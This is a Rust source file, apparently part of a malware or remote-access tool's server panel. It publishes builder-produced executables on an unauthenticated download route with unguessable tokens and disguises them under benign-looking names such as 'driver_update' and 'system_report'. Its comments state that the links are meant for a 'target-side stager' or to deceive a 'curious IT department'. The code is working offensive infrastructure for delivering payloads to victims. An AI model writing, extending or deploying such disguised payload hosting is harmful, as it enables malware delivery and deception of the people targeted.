// src/api/routes/payloads.rs
//
// Randomized payload hosting. When a builder job succeeds, the produced
// artifact is registered as a "hosted payload": an unguessable random token
// path plus a randomized BENIGN file name (the original extension is kept).
// The artifact is then served publicly - no API key - at
//
//     GET /dl/<token>/<name>
//
// so an operator can hand the link to a target-side stager (or a curious
// "IT department") without exposing the panel or an operator credential.
//
// The registry lives in memory on ApiContext (`payload_links`) and is also
// persisted to a JSON sidecar (dist/payload_links.json) so links survive
// server restarts. Writes go through the RCM atomic-write primitive
// (tmp file + rename) so a crash mid-write never corrupts the sidecar.

use axum::{
    extract::{ConnectInfo, Path, State},
    http::{header, StatusCode},
    response::{IntoResponse, Response},
    body::StreamBody,
};
use rand::{rngs::OsRng, RngCore};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::path::{Path as FsPath, PathBuf};
use std::sync::Arc;

use crate::api::state::{ApiContext, SharedPayloadLinks};

/// Sidecar location, relative to the server working directory (/app in the
/// container; dist/ is a host-mounted volume there).
pub const SIDECAR_PATH: &str = "dist/payload_links.json";

/// Per-IP download rate limit: requests per 60-second window.
const DL_RATE_LIMIT: u32 = 30;

/// Hosted links expire after this many seconds (7 days). Expired links, and
/// links whose artifact file has been deleted, are pruned on registration,
/// lookup, and sidecar load so the registry cannot grow without bound.
const PAYLOAD_LINK_TTL_SECS: i64 = 7 * 24 * 3600;

/// Benign cover-name bases for hosted payloads. A random 4-digit suffix is
/// appended half of the time; the artifact's original extension is kept.
const BENIGN_WORDS: [&str; 6] = [
    "driver_update",
    "system_report",
    "health_check",
    "service_pack",
    "firmware_check",
    "device_helper",
];

// ── Registry record ─────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HostedPayload {
    /// Unguessable URL token (24 lowercase hex chars from OsRng).
    pub token: String,
    /// Randomized benign file name (extension preserved from the artifact).
    pub name: String,
    /// Artifact path as reported by the builder (usually "dist/<file>").
    pub artifact_path: String,
    /// Build job that produced the artifact.
    pub job_id: String,
    pub created_at: String,
}

impl HostedPayload {
    pub fn download_url(&self) -> String {
        format!("/dl/{}/{}", self.token, self.name)
    }
}

// ── Helpers ─────────────────────────────────────────────────────────────

/// 24 lowercase hex characters from the OS CSPRNG (96 bits, unguessable).
fn random_token() -> String {
    let mut buf = [0u8; 12];
    OsRng.fill_bytes(&mut buf);
    hex::encode(buf)
}

/// Pick a randomized benign file name, keeping the artifact's extension.
fn benign_name(artifact_path: &str) -> String {
    let mut rng = OsRng;
    let word = BENIGN_WORDS[(rng.next_u32() as usize) % BENIGN_WORDS.len()];
    let mut name = word.to_string();
    if rng.next_u32() % 2 == 0 {
        name.push_str(&format!("_{:04}", rng.next_u32() % 10_000));
    }
    // Preserve the original extension (sanitized to lowercase alnum, <=8 chars).
    let ext = FsPath::new(artifact_path)
        .extension()
        .map(|e| e.to_string_lossy().into_owned())
        .unwrap_or_default();
    let ext: String = ext
        .chars()
        .filter(|c| c.is_ascii_alphanumeric())
        .take(8)
        .collect::<String>()
        .to_lowercase();
    if !ext.is_empty() {
        name.push('.');
        name.push_str(&ext);
    }
    name
}

/// Resolve an artifact path against the server CWD when relative (the
/// builder logs paths like "dist/exe_windows_xxxxxxxx.exe").
fn resolve_artifact(path: &str) -> PathBuf {
    let p = PathBuf::from(path);
    if p.is_absolute() {
        p
    } else {
        std::env::current_dir()
            .unwrap_or_else(|_| PathBuf::from("."))
            .join(p)
    }
}

// ── Persistence (JSON sidecar) ──────────────────────────────────────────

/// Load persisted links from dist/payload_links.json into the registry.
/// Missing/corrupt sidecar is non-fatal: hosting just starts empty.
pub fn load_registry(links: &SharedPayloadLinks) {
    let path = resolve_artifact(SIDECAR_PATH);
    let bytes = match std::fs::read(&path) {
        Ok(b) => b,
        Err(_) => return, // no sidecar yet - fine
    };
    match serde_json::from_slice::<HashMap<String, HostedPayload>>(&bytes) {
        Ok(mut map) => {
            prune_registry(&mut map);
            let n = map.len();
            {
                let mut reg = links.lock().unwrap_or_else(|e| e.into_inner());
                *reg = map;
            }
            // Persist the pruned view so the sidecar shrinks too.
            save_registry(links);
            eprintln!("[+] Payload hosting: restored {} link(s) from {}", n, path.display());
        }
        Err(e) => {
            eprintln!("[!] Payload hosting: ignoring corrupt sidecar {}: {}", path.display(), e);
        }
    }
}

/// Persist the registry to the sidecar via atomic write (tmp + rename).
fn save_registry(links: &SharedPayloadLinks) {
    let snapshot: HashMap<String, HostedPayload> = {
        let reg = links.lock().unwrap_or_else(|e| e.into_inner());
        reg.clone()
    };
    let json = match serde_json::to_string_pretty(&snapshot) {
        Ok(j) => j,
        Err(e) => {
            eprintln!("[!] Payload hosting: failed to serialize registry: {}", e);
            return;
        }
    };
    let path = resolve_artifact(SIDECAR_PATH);
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    if let Err(e) = crate::rcm::xml::atomic_write(&path, json.as_bytes()) {
        eprintln!("[!] Payload hosting: failed to persist {}: {}", path.display(), e);
    }
}

/// Drop links that are past the TTL or whose artifact file no longer
/// exists. Caller holds the registry lock.
fn prune_registry(reg: &mut HashMap<String, HostedPayload>) {
    let now = chrono::Utc::now().timestamp();
    reg.retain(|_, p| {
        // Compare epoch seconds: parsed timestamps are FixedOffset while
        // Utc::now() is Utc, and chrono does not subtract across the two.
        let fresh = chrono::DateTime::parse_from_rfc3339(&p.created_at)
            .map(|t| now - t.timestamp() < PAYLOAD_LINK_TTL_SECS)
            .unwrap_or(false);
        fresh && resolve_artifact(&p.artifact_path).is_file()
    });
}

// ── Registration (called by the builder job watcher on success) ─────────

/// Register a freshly built artifact as a hosted payload. Returns the
/// record (whose download_url() the job status then exposes) or None if
/// the artifact path is unusable.
pub fn register_hosted(
    links: &SharedPayloadLinks,
    job_id: &str,
    artifact_path: &str,
) -> Option<HostedPayload> {
    let resolved = resolve_artifact(artifact_path);
    if !resolved.is_file() {
        eprintln!("[!] Payload hosting: artifact {} not found - link not created",
            resolved.display());
        return None;
    }
    let payload = HostedPayload {
        token: random_token(),
        name: benign_name(artifact_path),
        artifact_path: artifact_path.to_string(),
        job_id: job_id.to_string(),
        created_at: chrono::Utc::now().to_rfc3339(),
    };
    {
        let mut reg = links.lock().unwrap_or_else(|e| e.into_inner());
        prune_registry(&mut reg);
        reg.insert(payload.token.clone(), payload.clone());
    }
    save_registry(links);
    Some(payload)
}

/// Find the public download URL for a given build job, if one was registered.
pub fn url_for_job(links: &SharedPayloadLinks, job_id: &str) -> Option<String> {
    let reg = links.lock().unwrap_or_else(|e| e.into_inner());
    reg.values()
        .find(|p| p.job_id == job_id)
        .map(|p| p.download_url())
}

// ── Public route: GET /dl/:token/:name (no auth) ────────────────────────

pub async fn serve_payload(
    State(state): State<Arc<ApiContext>>,
    ConnectInfo(peer): ConnectInfo<SocketAddr>,
    Path((token, name)): Path<(String, String)>,
) -> Response {
    // ── Per-IP rate limit (same sliding-window pattern as login) ──────
    {
        let mut limiter = state.dl_limiter.lock()
            .unwrap_or_else(|e| e.into_inner());
        let now = std::time::Instant::now();

        // Periodic cleanup: purge stale entries to prevent unbounded growth
        if limiter.len() > 1000 {
            limiter.retain(|_, (_, last)| now.duration_since(*last).as_secs() < 60);
        }

        let entry = limiter.entry(peer.ip().to_string()).or_insert((0, now));
        if now.duration_since(entry.1).as_secs() >= 60 {
            *entry = (0, now); // new window
        }
        entry.0 += 1;
        if entry.0 > DL_RATE_LIMIT {
            return (StatusCode::TOO_MANY_REQUESTS, "Rate limit exceeded").into_response();
        }
    }

    // Token must exist AND the requested name must match the registered
    // benign name, so neither component alone is enough to fetch a file.
    let payload = {
        let mut reg = state.payload_links.lock().unwrap_or_else(|e| e.into_inner());
        prune_registry(&mut reg);
        match reg.get(&token) {
            Some(p) if p.name == name => p.clone(),
            _ => return (StatusCode::NOT_FOUND, "Not found").into_response(),
        }
    };

    let path = resolve_artifact(&payload.artifact_path);
    // Stream the artifact rather than reading it whole: a large payload
    // must not block the async executor or balloon memory.
    let file = match tokio::fs::File::open(&path).await {
        Ok(f) => f,
        Err(_) => return (StatusCode::NOT_FOUND, "Not found").into_response(),
    };
    let len = file.metadata().await.map(|m| m.len()).unwrap_or(0);
    let body = StreamBody::new(tokio_util::io::ReaderStream::new(file));
    (
        StatusCode::OK,
        [
            (header::CONTENT_TYPE, "application/octet-stream".to_string()),
            (header::CONTENT_DISPOSITION,
                format!("attachment; filename=\"{}\"", payload.name)),
            (header::CONTENT_LENGTH, len.to_string()),
        ],
        body,
    ).into_response()
}

// ── Tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn token_is_24_hex_chars() {
        let t = random_token();
        assert_eq!(t.len(), 24);
        assert!(t.chars().all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase()));
    }

    #[test]
    fn tokens_are_unique() {
        assert_ne!(random_token(), random_token());
    }

    #[test]
    fn benign_name_preserves_extension() {
        for _ in 0..20 {
            let n = benign_name("dist/exe_windows_ab12cd34.exe");
            assert!(n.ends_with(".exe"), "name={}", n);
            let base = &n[..n.len() - 4];
            assert!(BENIGN_WORDS.iter().any(|w| base == *w
                || (base.starts_with(*w) && base[w.len()..].starts_with('_'))),
                "unexpected base: {}", base);
        }
    }

    #[test]
    fn benign_name_no_extension() {
        let n = benign_name("dist/exe_linux_ab12cd34");
        assert!(!n.contains('.'));
    }

    #[test]
    fn download_url_format() {
        let p = HostedPayload {
            token: "abc123".into(),
            name: "driver_update_0042.exe".into(),
            artifact_path: "dist/x.exe".into(),
            job_id: "j1".into(),
            created_at: "now".into(),
        };
        assert_eq!(p.download_url(), "/dl/abc123/driver_update_0042.exe");
    }

    #[test]
    fn sidecar_roundtrip_serde() {
        let p = HostedPayload {
            token: "ff00".into(),
            name: "health_check.bin".into(),
            artifact_path: "dist/x.bin".into(),
            job_id: "j9".into(),
            created_at: "t".into(),
        };
        let mut map = HashMap::new();
        map.insert(p.token.clone(), p);
        let json = serde_json::to_string(&map).unwrap();
        let back: HashMap<String, HostedPayload> = serde_json::from_str(&json).unwrap();
        assert_eq!(back["ff00"].name, "health_check.bin");
    }

    #[test]
    fn prune_drops_expired_links() {
        let mut map = HashMap::new();
        map.insert("old".to_string(), HostedPayload {
            token: "old".into(),
            name: "a.bin".into(),
            artifact_path: "dist/x.bin".into(),
            job_id: "j".into(),
            created_at: (chrono::Utc::now() - chrono::Duration::days(30)).to_rfc3339(),
        });
        prune_registry(&mut map);
        assert!(map.is_empty());
    }

    #[test]
    fn prune_drops_links_whose_artifact_is_gone() {
        let mut map = HashMap::new();
        map.insert("gone".to_string(), HostedPayload {
            token: "gone".into(),
            name: "a.bin".into(),
            artifact_path: "dist/definitely-not-present-7f3a9c.bin".into(),
            job_id: "j".into(),
            created_at: chrono::Utc::now().to_rfc3339(),
        });
        prune_registry(&mut map);
        assert!(map.is_empty());
    }

    #[test]
    fn prune_keeps_fresh_links_with_existing_artifact() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        let mut map = HashMap::new();
        map.insert("fresh".to_string(), HostedPayload {
            token: "fresh".into(),
            name: "a.bin".into(),
            artifact_path: tmp.path().to_string_lossy().into_owned(),
            job_id: "j".into(),
            created_at: chrono::Utc::now().to_rfc3339(),
        });
        prune_registry(&mut map);
        assert!(map.contains_key("fresh"));
    }

    #[test]
    fn prune_drops_unparseable_timestamps() {
        // A link whose age cannot be determined is treated as expired.
        let tmp = tempfile::NamedTempFile::new().unwrap();
        let mut map = HashMap::new();
        map.insert("unknown-age".to_string(), HostedPayload {
            token: "unknown-age".into(),
            name: "a.bin".into(),
            artifact_path: tmp.path().to_string_lossy().into_owned(),
            job_id: "j".into(),
            created_at: "not-a-date".into(),
        });
        prune_registry(&mut map);
        assert!(map.is_empty());
    }
}
